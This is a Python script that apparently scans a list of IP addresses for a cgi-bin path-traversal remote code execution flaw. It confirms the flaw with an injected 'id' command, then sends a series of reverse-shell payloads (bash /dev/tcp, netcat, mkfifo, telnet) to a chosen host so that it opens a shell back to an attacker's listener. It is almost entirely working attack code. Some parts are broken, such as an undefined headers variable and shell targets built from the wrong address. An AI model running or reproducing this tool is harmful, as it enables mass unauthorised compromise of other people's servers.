import urllib.request
import ssl
import sys

p_ip = []
e_ip = []

def poc(url):
    plugin_list = [
        "/cgi-bin/.%%32%65",
        "/cgi-bin/%25%32%65",
        "/cgi-bin/%25%32%65%32%65",
        "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65",
        "/cgi-bin/%25%32%65/%25%32%65/%25%32%65/%25%32%65/%25%32%65/%25%32%65/%25%32%65",
    ]
    headers = {"User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1"}
    p_list = []
    for plugin_path in plugin_list:
        try:
            payload = url + plugin_path
            data = bytes('echo Content-Type: text/plain; echo;id'.encode('utf-8'))
            req = urllib.request.Request(url=payload, headers=headers, data=data)
            res = urllib.request.urlopen(req, timeout=5)
            code = res.getcode()
            context = res.read()

            if "uid" in context.decode('utf-8') and code == 200:
                p_list.append(payload)
        except Exception as e:
            pass
    if len(p_list) > 0:
        p_ip.append(url)

def exp(url):
    plugin_list = [
        "/cgi-bin/.%%32%65",
        "/cgi-bin/%25%32%65",
        "/cgi-bin/%25%32%65%32%65",
        "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65",
        "/cgi-bin/%25%32%65/%25%32%65/%25%32%65/%25%32%65/%25%32%65/%25%32%65/%25%32%65",
    ]
    headers = {"User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1"}
    payload_lib = {}
    for plugin_path in plugin_list:
        try:
            payload = url + plugin_path
            data = bytes('echo Content-Type: text/plain; echo;id'.encode('utf-8'))
            req = urllib.request.Request(url=payload, headers=headers, data=data)
            res = urllib.request.urlopen(req, timeout=5)
            code = res.getcode()
            context = res.read()

            if "uid" in context.decode('utf-8') and code == 200:
                payload_lib[payload] = "Echo: " + context.decode('utf-8')
                e_ip.append(url)
        except Exception as e:
            pass
    if len(payload_lib) > 0:
        print("RCE vulnerability found:")
        print("------------Payload-----------\n")
        for i in payload_lib:
            print("Request line: {}".format(i))
            print("Request body: echo Content-Type: text/plain; echo;id")
            print("{}".format(payload_lib[i]).replace("\n", ""))
            print()
        print("-" * 30)
    else:
        print("No RCE vulnerability found for the target\n")

def real_exploit(url, lhost, lport):
    print("Executing commands on the victim's PC...")
    listen_ip = url.split("//")[1].split("/")[0].split(":")[0]
    listen_port = url.split("//")[1].split("/")[0].split(":")[1]
    
    commands = [
        'bash -i >& /dev/tcp/{}/{lport} 0>&1'.format(listen_ip, lport=listen_port),
        '0<&196;exec 196<>/dev/tcp/{}/{lport}; bash <&196 >&196 2>&196'.format(listen_ip, lport=listen_port),
        'exec 5<>/dev/tcp/{}/{lport}; cat <&5 | while read line; do $line 2>&5 >&5; done'.format(listen_ip, lport=listen_port),
        'bash -i 5<> /dev/tcp/{}/{lport} 0<&5 1>&5 2>&5'.format(listen_ip, lport=listen_port),
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f'.format(lhost=lhost, lport=lport),
        'nc {lhost} {lport} -e bash'.format(lhost=lhost, lport=lport),
        'busybox nc {lhost} {lport} -e bash'.format(lhost=lhost, lport=lport),
        'nc -c bash {lhost} {lport}'.format(lhost=lhost, lport=lport),
        'TF=$(mktemp -u);mkfifo $TF && telnet {lhost} {lport} 0<$TF | bash 1>$TF'.format(lhost=lhost, lport=lport)
    ]

    for command in commands:
        try:
            payload = url + command
            data = bytes('echo Content-Type: text/plain; echo;{}'.format(command).encode('utf-8'))
            req = urllib.request.Request(url=payload, headers=headers, data=data)
            res = urllib.request.urlopen(req, timeout=5)
            code = res.getcode()
            context = res.read()
            print("Command: {}".format(command))
            print("Response:\n{}".format(context.decode('utf-8')))
            print()
        except Exception as e:
            print("Command: {}".format(command))
            print("Failed to execute command")
            print()

def main():
    _ip = []
    with open("ip.txt", "r", encoding="utf-8") as f:
        iplib = f.readlines()
    i = 0
    print('Running poc detection...')
    for ip in iplib:
        i += 1
        try:
            url = "http://{}".format(ip.replace("\n", ""))
            print("Checking target {} [http]:".format(i))
            print(url)
            poc(url)
        except Exception as e:
            print('No vulnerabilities found for the target')
            print(e)
        try:
            print("Checking target {} [https]:".format(i))
            url = "https://{}".format(ip.replace("\n", ""))
            print(url)
            poc(url)
        except Exception as e:
            print('No vulnerabilities found for the target\n')
        print()

    v_list = list(set(p_ip))
    print("-" * 30)
    print("-" * 30)
    print('Running exp detection...')
    n = 0
    for v in v_list:
        n += 1
        try:
            url = "http://{}".format(v)
            print("Checking target {} [http]:".format(n))
            print(url)
            exp(url)
        except Exception as e:
            print('No vulnerabilities found for the target')
            print(e)
        try:
            print("Checking target {} [https]:".format(n))
            url = "https://{}".format(v)
            print(url)
            exp(url)
        except Exception as e:
            print('No vulnerabilities found for the target\n')

    if len(e_ip) > 0:
        print('Number of hosts with RCE vulnerability: {}'.format(len(e_ip)))
        while True:
            host_num = input('Please select the host number to exploit (0 to exit): ')
            if host_num == '0':
                print('Exiting...')
                sys.exit()
            elif host_num.isnumeric() and int(host_num) in range(1, len(e_ip) + 1):
                host = e_ip[int(host_num) - 1]
                break
            else:
                print('Invalid input. Please try again.')
        
        lhost = input('Please enter the listener IP: ')
        lport = input('Please enter the listener port: ')
        
        print('Exploiting host: {}'.format(host))
        real_exploit(host, lhost, lport)
    else:
        print('No hosts with RCE vulnerability found.')

if __name__ == "__main__":
    main()
